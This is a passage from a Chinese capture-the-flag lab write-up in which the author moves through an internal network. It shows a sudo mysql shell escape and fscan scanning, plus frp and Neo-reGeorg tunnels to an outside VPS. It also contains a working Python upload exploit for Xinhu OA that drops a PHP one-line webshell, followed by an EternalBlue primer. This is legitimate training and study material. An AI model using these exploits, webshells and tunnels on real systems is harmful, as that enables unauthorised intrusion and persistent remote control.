+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760090085493-e9235dbb-a5ec-4b66-8347-a53507bcc303.png" referrerpolicy="no-referrer"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo mysql -e <span class="string">&#x27;\! cat /root/flag/flag01.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760090059886-9daddddf-f7b2-4d4e-93f7-9e7da6f02181.png" referrerpolicy="no-referrer"></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;60b53231-</span><br></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><h2 id="内网横向移动——查网段"><a href="#内网横向移动——查网段" class="headerlink" title="内网横向移动——查网段"></a>内网横向移动——查网段</h2><p>由于题目提示 flag各部分位于不同的机器上，所以这里我们要通过内网横向移动，进而获取<strong>同一内网中的其他主机或系统里面的flag</strong></p>
+<blockquote>
+<p><strong>内网横向移动（Lateral Movement）</strong> 是指攻击者在成功入侵<strong>一台内网主机</strong>后，以此为跳板，<strong>进一步渗透同一内网中的其他主机或系统</strong>的过程。它是红队&#x2F;渗透测试&#x2F;APT 攻击中的关键阶段，目标是扩大控制范围、提升权限、最终获取核心资产（如域控、数据库、OA 系统等）。  </p>
+</blockquote>
+<p>这里首先输入以下指令，查一下自身的网段</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ip a</span><br><span class="line"><span class="comment">#ip addr show</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>网段是什么？  一组可以直接通信的 IP 地址集合 。</p>
+<p>&#x2F;24：小网段，254 个 IP，最常用</p>
+<p>&#x2F;16：大网段，6.5 万个 IP，常见于云环境或大型内网</p>
+<p>举例：<strong>&#x2F;24 是一栋楼，&#x2F;16 是一个小区。你住在 1 号楼 15 室，先敲同楼的门，别一上来就跑遍整个小区。</strong></p>
+</blockquote>
+<p>回显了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="number">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="number">1000</span></span><br><span class="line">    link/loopback <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> brd <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line">    inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8</span> scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::<span class="number">1</span>/<span class="number">128</span> scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"><span class="number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="number">1500</span> qdisc mq state UP group default qlen <span class="number">1000</span></span><br><span class="line">    link/ether <span class="number">00</span>:<span class="number">16</span>:3e:2d:b7:<span class="number">50</span> brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet <span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span>/<span class="number">16</span> brd <span class="number">172.22</span><span class="number">.255</span><span class="number">.255</span> scope <span class="keyword">global</span> dynamic eth0</span><br><span class="line">       valid_lft 1892157127sec preferred_lft 1892157127sec</span><br><span class="line">    inet6 fe80::<span class="number">216</span>:3eff:fe2d:b750/<span class="number">64</span> scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>这里主要看<code>**eth0**</code>** 接口（主网卡）**</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,...&gt;</span><br><span class="line">    inet <span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span>/<span class="number">16</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>关键信息</strong>：该主机的 **内网 IP 是 **<code>**172.22.1.15**</code>；</li>
+<li>子网掩码 <code>/16</code> 表示 **网段是 **<code>**172.22.0.0/16**</code>（即 <code>172.22.0.1</code> ~ <code>172.22.255.254</code>）；</li>
+<li>我们这里查 <font style="background-color:#E7E9E8;">172.22.1.0&#x2F;24 </font><strong>（即 <strong><code>**172.22.1.0**</code></strong> ~ <strong><code>**172.22.1.255**</code></strong>）</strong></li>
+</ul>
+<h2 id="内网扫描：使用-fscan-扫描存活机器"><a href="#内网扫描：使用-fscan-扫描存活机器" class="headerlink" title="内网扫描：使用 fscan 扫描存活机器"></a>内网扫描：使用 fscan 扫描存活机器</h2><p>得到网段后，我们扫描一下内网中有哪些存活机器，我们先用蚁剑上传 <code>fscan</code></p>
+<blockquote>
+<p><strong>fscan是什么？</strong></p>
+<p><code>fscan</code> 是一款由 <strong>中国安全研究员</strong> 开发的<strong>内网综合扫描工具</strong>，常用于渗透测试和红队行动中，主打 <strong>快速、轻量、一体化</strong>，能自动完成多种常见漏洞的探测与利用。  </p>
+</blockquote>
+<p>运行 <code>fscan</code>（通常指 <code>fscan.exe</code> 或 <code>fscan_linux</code>）会对目标网段执行<strong>自动化批量扫描</strong>，主要包括以下功能： </p>
+<table>
+<thead>
+<tr>
+<th><strong>存活探测</strong></th>
+<th>ICMP ping + TCP 端口探测（判断主机是否在线）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>端口扫描</strong></td>
+<td>扫描常见高危端口（如 21, 22, 23, 80, 445, 3306, 6379, 7001, 8080 等）</td>
+</tr>
+<tr>
+<td><strong>弱口令爆破</strong></td>
+<td>自动尝试默认&#x2F;弱口令，支持：   • SMB（Windows 共享）   • FTP   • SSH   • MySQL   • MSSQL   • Redis   • PostgreSQL   • RDP（部分版本）   • Tomcat   • WebLogic 等</td>
+</tr>
+<tr>
+<td><strong>漏洞检测</strong></td>
+<td>自动检测常见漏洞，例如：   • <strong>MS17-010</strong>（永恒之蓝）   • <strong>Redis 未授权访问</strong>   • <strong>WebLogic CVE-2017-10271 &#x2F; CVE-2019-2725</strong>   • <strong>Shiro 反序列化</strong>   • <strong>Spring Cloud Config 目录遍历</strong>   • <strong>ThinkPHP RCE</strong>（如你之前提到的 TP5.0.23）   • <strong>Jboss、Apache Unomi、Nexus 等</strong></td>
+</tr>
+<tr>
+<td><strong>信息收集</strong></td>
+<td>获取 Banner、网站标题、中间件版本等</td>
+</tr>
+<tr>
+<td><strong>代理支持</strong></td>
+<td>部分版本支持通过代理扫描</td>
+</tr>
+</tbody></table>
+<p>使用fscan进行扫描，并将结果返回fscan.txt</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./fscan -h <span class="number">172.22</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> &gt; fscan.txt</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span>     <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>      <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>     <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>     <span class="keyword">is</span> alive</span><br><span class="line">[*] Icmp alive hosts <span class="built_in">len</span> <span class="keyword">is</span>: <span class="number">4</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>:<span class="number">88</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>:<span class="number">3306</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>:<span class="number">445</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>:<span class="number">445</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>:<span class="number">139</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>:<span class="number">139</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>:<span class="number">139</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>:<span class="number">135</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>:<span class="number">135</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>:<span class="number">135</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>:<span class="number">445</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line">[*] alive ports <span class="built_in">len</span> <span class="keyword">is</span>: <span class="number">14</span></span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]<span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]<span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span></span><br><span class="line">[*] OsInfo <span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>	(Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span>)</span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span>        code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">5578</span>   title:Bootstrap Material Admin</span><br><span class="line">[*] NetBios <span class="number">172.22</span><span class="number">.1</span><span class="number">.2</span>      [+] DC:DC01.xiaorang.lab             Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span></span><br><span class="line">[*] NetBios <span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>     XIAORANG-WIN7.xiaorang.lab          Windows Server <span class="number">2008</span> R2 Enterprise <span class="number">7601</span> Service Pack <span class="number">1</span></span><br><span class="line">[+] MS17-<span class="number">0</span>10 <span class="number">172.22</span><span class="number">.1</span><span class="number">.21</span>	(Windows Server <span class="number">2008</span> R2 Enterprise <span class="number">7601</span> Service Pack <span class="number">1</span>)</span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>        code:<span class="number">302</span> <span class="built_in">len</span>:<span class="number">0</span>      title:<span class="literal">None</span> 跳转url: http://<span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>?m=login</span><br><span class="line">[*] NetBios <span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>     XIAORANG-OA01.xiaorang.lab          Windows Server <span class="number">2012</span> R2 Datacenter <span class="number">9600</span></span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]<span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span></span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]<span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span></span><br><span class="line">[*] WebTitle http://<span class="number">172.22</span><span class="number">.1</span><span class="number">.18</span>?m=login code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">4012</span>   title:信呼协同办公系统</span><br><span class="line">[+] PocScan http://<span class="number">172.22</span><span class="number">.1</span><span class="number">.15</span> poc-yaml-thinkphp5023-method-rce poc1</span><br><span class="line">已完成 <span class="number">14</span>/<span class="number">14</span></span><br><span class="line">[*] 扫描结束,耗时: <span class="number">10.647487243</span>s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以获得以下信息</p>
+<table>
+<thead>
+<tr>
+<th><strong>172.22.1.15</strong></th>
+<th>—</th>
+<th>—</th>
+<th>80, 22</th>
+<th>Web（ThinkPHP）、SSH</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>172.22.1.2</strong></td>
+<td><code>DC01</code></td>
+<td>Windows Server 2016</td>
+<td>88, 135, 139, 445</td>
+<td><strong>DC域控（Domain Controller）</strong></td>
+</tr>
+<tr>
+<td><strong>172.22.1.18</strong></td>
+<td><code>XIAORANG-OA01</code></td>
+<td>Windows Server 2012 R2</td>
+<td>80, 135, 139, 445, 3306</td>
+<td><strong>信呼 OA 系统 + MySQL</strong></td>
+</tr>
+<tr>
+<td><strong>172.22.1.21</strong></td>
+<td><code>XIAORANG-WIN7</code></td>
+<td>Windows Server 2008 R2 SP1</td>
+<td>135, 139, 445</td>
+<td><strong>存在 MS17-010（永恒之蓝）！</strong></td>
+</tr>
+</tbody></table>
+<h2 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h2><p>这里我们先打 信呼OA 这个漏洞  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%BF%A1%E5%91%BCOA-qcloudCosAction.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md">Vulnerability-Wiki&#x2F;docs-base&#x2F;docs&#x2F;oa&#x2F;信呼OA-qcloudCosAction.php-任意文件上传漏洞.md at master · Threekiii&#x2F;Vulnerability-Wiki</a></p>
+<blockquote>
+<p><strong>信呼 OA</strong>（全称：<strong>信呼协同办公系统</strong>）是一款由国内开发者（“信呼团队”）开发的 <strong>开源免费企业协同办公平台</strong>，主要面向中小型企业，提供流程审批、文档管理、任务协作、人事管理等功能。  </p>
+</blockquote>
+<p>这里需要内网穿透，使得我们在攻击机windows系统中也能访问内网</p>
+<h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><p>首先尝试frp内网穿透  （ 目的是使我们能够在攻击机访问内网的服务  ）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>我们需要将 <code>frps</code> 和 <code>frps.toml</code> 上传到我们的 <code>vps</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = <span class="number">7000</span></span><br></pre></td></tr></table></figure>
+
+<p>将<code>frpc</code>和 <code>frpc.toml</code> 上传到我们的靶机  </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serverAddr = <span class="string">&quot;114.132.49.165&quot;</span>      <span class="comment"># frps 服务端的公网 IP</span></span><br><span class="line">serverPort = <span class="number">7000</span>                 <span class="comment"># frps 控制端口（默认 7000）</span></span><br><span class="line"></span><br><span class="line">[[proxies]]                       <span class="comment"># 开始定义一个代理配置</span></span><br><span class="line">name = <span class="string">&quot;proxy&quot;</span>                    <span class="comment"># 代理名称，需唯一</span></span><br><span class="line"><span class="built_in">type</span> = <span class="string">&quot;tcp&quot;</span>                      <span class="comment"># 代理类型为 TCP</span></span><br><span class="line">localIP = <span class="string">&quot;39.98.120.52&quot;</span>           <span class="comment"># 内网目标服务的 IP</span></span><br><span class="line">localPort = <span class="number">80</span>                    <span class="comment"># 内网目标服务的端口</span></span><br><span class="line">remotePort = <span class="number">8080</span>                 <span class="comment"># 在 VPS 上映射的公网端口</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机执行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./frpc -c frpc.toml</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>vps</code> 执行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">./frps -c frps.toml</span><br></pre></td></tr></table></figure>
+
+<p>但是这里蚁剑网络不是很好，没有成功，我们换一个方法</p>
+<h3 id="Neo-reGeorg-Proxifier"><a href="#Neo-reGeorg-Proxifier" class="headerlink" title="Neo-reGeorg+Proxifier"></a>Neo-reGeorg+Proxifier</h3><p>这里学习了一下 使用Neo-reGeorg+Proxifier实现内网穿透</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/KHZ521/p/15931511.html">https://www.cnblogs.com/KHZ521/p/15931511.html</a></p>
+<p>生成密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py generate -k jato</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760376749888-c75bc7a0-a2c4-4a7b-9a07-3d89184b5cdc.png" referrerpolicy="no-referrer"></p>
+<p>自动生成脚本文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760376792395-df1cb103-9dfd-4a9a-9f6b-eb69427dc9b3.png" referrerpolicy="no-referrer"></p>
+<p>将对应脚本文件上传的目录的应用web目录，并确定可以访问</p>
+<p>这里将tunnel.php上传至蚁剑，发现可以正常访问</p>
+<p>使用neoreg连接目标脚本文件（-p指定端口，默认为1080）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 neoreg.py -k &lt;已经设定的密钥&gt; -u &lt;http://xxx.xxx.xxx/tunnel.php&gt; -p &lt;prot&gt;</span><br><span class="line">python3 neoreg.py -k jato -u http://xxx.xxx.xxx/tunnel.php -p 1080</span><br></pre></td></tr></table></figure>
+
+<p>确定脚本正常工作</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760377008383-4f1de7fb-e93a-4cbe-ac03-846b222f2516.png" referrerpolicy="no-referrer"></p>
+<p>接下来<strong>配合Proxifier实现流量转发</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760376604085-87136f4c-d309-409a-9322-f80ef84aa811.png" referrerpolicy="no-referrer"></p>
+<p>此时可以正常穿透</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760374641985-7d1ec9dd-f024-4ebb-96ee-5d14bc4e7c71.png" referrerpolicy="no-referrer"></p>
+<h2 id="信呼OA-qcloudCosAction-php-任意文件上传漏洞"><a href="#信呼OA-qcloudCosAction-php-任意文件上传漏洞" class="headerlink" title="信呼OA qcloudCosAction.php 任意文件上传漏洞"></a>信呼OA qcloudCosAction.php 任意文件上传漏洞</h2><p>爆破得到账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin123</span><br></pre></td></tr></table></figure>
+
+<p>成功进入系统</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760374696646-d0e7a988-26a5-41a6-9772-0d5139d13da6.png" referrerpolicy="no-referrer"></p>
+<p>这里直接打 信呼OA 这个漏洞，有一个poc</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1.php为webshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要修改以下内容：</span></span><br><span class="line"><span class="comment"># url_pre = &#x27;http://&lt;IP&gt;/&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;adminuser&#x27;: &#x27;&lt;ADMINUSER_BASE64&gt;&#x27;,</span></span><br><span class="line"><span class="comment"># &#x27;adminpass&#x27;: &#x27;&lt;ADMINPASS_BASE64&gt;&#x27;,</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同目录下需要放一个一句话木马 1.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>木马上传成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760374817328-f2e17b35-d1a5-44e2-a58f-0bae3e09a869.png" referrerpolicy="no-referrer"></p>
+<p>访问一下网页，发现可以正常解析</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760376344254-be5c8b62-fcca-4cd2-8b3d-364ef39a0b59.png" referrerpolicy="no-referrer"></p>
+<p>蚁剑连接，注意这里一定要先改一下代理设置，否则会连不上一句话木马</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760375796106-4f852b8b-a1ee-4418-a933-d59905a591fd.png" referrerpolicy="no-referrer"></p>
+<p>连接成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760375899011-670e757f-b951-4987-b68b-0af3cdd061e2.png" referrerpolicy="no-referrer"></p>
+<p>由于目录比较多，我们可以先查找匹配一下flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /s flag</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760376105213-1fefb654-3777-48ad-8854-faa24971d493.png" referrerpolicy="no-referrer"></p>
+<p>直接访问就可以拿到第二个flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1760375847848-e3f6e177-5087-41f1-bcc0-608b223ba494.png" referrerpolicy="no-referrer"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2ce3-4813-87d4-</span><br></pre></td></tr></table></figure>
+
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><h2 id="MS17-010（永恒之蓝）攻陷-Win7-主机"><a href="#MS17-010（永恒之蓝）攻陷-Win7-主机" class="headerlink" title="MS17-010（永恒之蓝）攻陷 Win7 主机"></a>MS17-010（永恒之蓝）攻陷 Win7 主机</h2><p>在flag2中我们对内网进行扫描，扫出来了永恒之蓝</p>
+<table>
+<thead>
+<tr>
+<th><strong>172.22.1.21</strong></th>
+<th><code>XIAORANG-WIN7</code></th>
+<th>Windows Server 2008 R2 SP1</th>
+<th>135, 139, 445</th>
+<th><strong>存在 MS17-010（永恒之蓝）！</strong></th>
+</tr>
+</thead>
+</table>
+<blockquote>
+<p>首先了解一下什么是<strong>永恒之蓝？</strong></p>
+<p><strong>“永恒之蓝”（EternalBlue）</strong> 是由美国国家安全局（NSA）开发的一个高危漏洞利用工具，后被黑客组织 <strong>Shadow Brokers</strong> 在 2017 年 4 月公开泄露。它利用的是 Windows 操作系统中 <strong>SMB（Server Message Block）协议</strong>的一个远程代码执行漏洞。编号：CVE-2017-0146、MS17-010。</p>
+<ul>
+<li><strong>漏洞位置</strong>：Windows SMBv1 协议的内核驱动（<code>srv.sys</code>）中。</li>
+<li><strong>漏洞类型</strong>：<strong>缓冲区溢出（Buffer Overflow）</strong>，具体是由于 SMB 协议在处理恶意构造的“写入”请求时，未正确验证数据长度，导致攻击者可以向内核内存中写入任意数据。</li>
+</ul>
+<p> 攻击者只需目标开放 <strong>TCP 445 端口（SMB 服务）</strong>，即可远程执行任意代码， 成功利用后可获得 <strong>SYSTEM 权限</strong>（最高权限）。  </p>
+</blockquote>
+<p>要成功利用 EternalBlue，目标必须同时满足以下条件： </p>
+<table>
+<thead>
+<tr>
+<th>✅ <strong>未安装 MS17-010 补丁</strong></th>
+<th>微软在 2017 年 3 月发布修复补丁（如 KB4013389）。若已打补丁，则无法利用。</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>✅ <strong>启用 SMBv1 协议</strong></td>
+<td>Windows 默认在 Win10&#x2F;Server 2016+ 中禁用 SMBv1，但 Win7&#x2F;2008 R2 默认开启。</td>
+</tr>
+<tr>
+<td>✅ <strong>445 端口开放且可访问</strong></td>
+<td>攻击者必须能通过 TCP 445 端口与目标通信（无防火墙拦截）。</td>
+</tr>
